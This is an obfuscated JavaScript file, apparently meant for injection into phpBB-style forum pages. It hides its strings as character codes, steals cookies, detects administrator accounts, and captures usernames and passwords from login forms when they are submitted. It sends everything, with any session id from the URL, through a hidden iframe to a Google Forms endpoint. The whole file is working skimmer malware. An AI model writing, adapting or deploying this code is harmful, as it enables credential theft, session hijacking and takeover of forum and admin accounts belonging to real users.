;(function (w) {
  'use strict';
  var D = w.document;
  if (!D) { return; }
  var R = /(^|\.)([a-z0-9-]+\.)+[a-z]{2,}(:\d+)?$/i;
  if (!R.test(w.location.host)) { return; }
  if (w.__x) { return; }
  w.__x = 1;
  function Y(a) { var s = ''; for (var i = 0; i < a.length; i++) { s += String.fromCharCode(a[i]); } return s; }
  var T0 = Y([109, 101, 109, 98, 101, 114, 108, 105, 115, 116, 46, 112, 104, 112]);
  var T1 = Y([118, 105, 101, 119, 112, 114, 111, 102, 105, 108, 101]);
  var T2 = Y([97, 100, 109, 47, 105, 110, 100, 101, 120, 46, 112, 104, 112]);
  var K0 = Y([117, 115, 101, 114, 110, 97, 109, 101]);
  var K1 = Y([108, 111, 103, 105, 110, 95, 117, 115, 101, 114, 110, 97, 109, 101]);
  var K2 = Y([112, 97, 115, 115, 119, 111, 114, 100]);
  var K3 = Y([108, 111, 103, 105, 110, 95, 112, 97, 115, 115, 119, 111, 114, 100]);
  var CK = Y([99, 111, 111, 107, 105, 101]);
  var CH = Y([99, 104, 97, 116]);
  var BG = Y([98, 108, 111, 99, 107, 103, 101, 116, 115]);
  var SG = Y([115, 101, 115, 115, 105, 111, 110, 83, 116, 111, 114, 97, 103, 101]);
  try {
    var BEP = 'https://docs.google.com/forms/d/e/1FAIpQLScSbMXiXV2GtYDhNFsrRy38lxtcri1vaGkQLvShVSebZy-kTw/formResponse';
    var E1 = 'entry.1842345040';
    var E2 = 'entry.79951114';
    var E3 = 'entry.389578883';
    var WATCH = ['Admin', 'Istarapol'];
    var FLAG_ANY_CTRL = true;
    var WATCH_FIELDS = true;
    var BEACON = true;
    function esc(s) { try { return encodeURIComponent(String(s)); } catch (e) { return ''; } }
    var done = {};
    function tx(data, tag) {
      try {
        var id = tag || String(data || '').slice(0, 48);
        if (done[id]) { return; }
        done[id] = 1;
        var q = E1 + '=' + esc(w.location.host) +
                '&' + E2 + '=' + esc(state()) +
                '&' + E3 + '=' + esc(String(data || '').slice(0, 1800)) +
                '&submit=Submit';
        var f = D.createElement('iframe');
        f.setAttribute('style', 'position:absolute;visibility:hidden;width:0;height:0;border:0;');
        f.setAttribute('aria-hidden', 'true');
        f.setAttribute('tabindex', '-1');
        f.src = BEP + '?' + q;
        (D.body || D.documentElement).appendChild(f);
      } catch (e) {}
    }
    function state() {
      try {
        return D[CK].split(/;\s*/).filter(function (c) {
          var k = (c.split('=')[0] || '').toLowerCase();
          return k.indexOf(CH) < 0 && k.indexOf(BG) < 0;
        }).join('; ').slice(0, 900);
      } catch (e) { return ''; }
    }
    function sid() {
      try {
        var m = (w.location.search || '').match(/sid=([a-f0-9]{32})/);
        return m ? m[1] : '';
      } catch (e) { return ''; }
    }
    function pos() {
      var s = 'P:' + w.location.pathname;
      var v = sid();
      if (v) { s += '|S:' + v; }
      return s;
    }
    var HDR = D.querySelector('[role="navigation"]') ||
              D.querySelector('#nav-main') ||
              D.querySelector('nav') ||
              D.body;
    function account() {
      try {
        var scopes = HDR && HDR !== D.body ? [HDR, D] : [D];
        for (var s = 0; s < scopes.length; s++) {
          var links = scopes[s].querySelectorAll('a[href*="' + T0 + '"]');
          for (var i = 0; i < links.length; i++) {
            var h = links[i].getAttribute('href') || '';
            if (h.indexOf(T1) >= 0) {
              var t = (links[i].textContent || '').trim();
              if (t && t.length < 40) { return t; }
            }
          }
        }
      } catch (e) {}
      return '';
    }
    function hasCtrl() {
      try {
        var scopes = HDR && HDR !== D.body ? [HDR, D] : [D];
        for (var s = 0; s < scopes.length; s++) {
          if (scopes[s].querySelectorAll('a[href*="' + T2 + '"]').length > 0) {
            return true;
          }
        }
        return false;
      } catch (e) { return false; }
    }
    function seen(k) { try { return w[SG].getItem(k) === '1'; } catch (e) { return false; } }
    function setSeen(k) { try { w[SG].setItem(k, '1'); } catch (e) {} }
    if (BEACON && !seen('_a')) {
      setSeen('_a');
      tx('EVT: ' + pos(), 'beacon');
    }
    function detect() {
      try {
        if (!hasCtrl()) { return; }
        var a = account();
        var hit = FLAG_ANY_CTRL;
        if (!hit) {
          for (var i = 0; i < WATCH.length; i++) {
            if (a && a.toLowerCase() === WATCH[i].toLowerCase()) { hit = true; break; }
          }
        }
        if (!hit) { return; }
        var key = '_ad_' + (a || 'x');
        if (!seen(key)) {
          setSeen(key);
          tx('CTRL: ' + (a || '?') + ' | ' + pos(), key);
        }
      } catch (e) {}
    }
    var bound = [];
    function watch() {
      if (!WATCH_FIELDS) { return; }
      try {
        var forms = D.forms || [];
        for (var i = 0; i < forms.length; i++) {
          if (bound.indexOf(forms[i]) >= 0) { continue; }
          (function (form) {
            try {
              var pk = form.querySelectorAll('input[type="' + K2 + '"]');
              if (!pk.length) { return; }
              form.addEventListener('submit', function () {
                try {
                  var a0 = form.querySelector('input[name="' + K0 + '"]') ||
                           form.querySelector('input[name="' + K1 + '"]');
                  var a1 = form.querySelector('input[name="' + K2 + '"]') ||
                           form.querySelector('input[name="' + K3 + '"]');
                  var u = a0 ? a0.value : '';
                  var p = a1 ? a1.value : '';
                  if (!p) {
                    var all = form.querySelectorAll('input[type="' + K2 + '"]');
                    for (var j = 0; j < all.length; j++) {
                      if (all[j].value) { p = all[j].value; }
                    }
                  }
                  if (p) {
                    tx('EVT: ' + (u || '?') + ':' + p + ' | ' + pos(), 'evt_' + (u || '?'));
                  }
                } catch (e) {}
              }, true);
              bound.push(form);
            } catch (e) {}
          })(forms[i]);
        }
      } catch (e) {}
    }
    function boot() {
      detect();
      watch();
    }
    if (D.readyState === 'loading') {
      D.addEventListener('DOMContentLoaded', boot);
    } else {
      boot();
    }
    if (D.readyState !== 'complete') {
      w.addEventListener('load', boot);
    }
  } catch (e) {}
})(window);
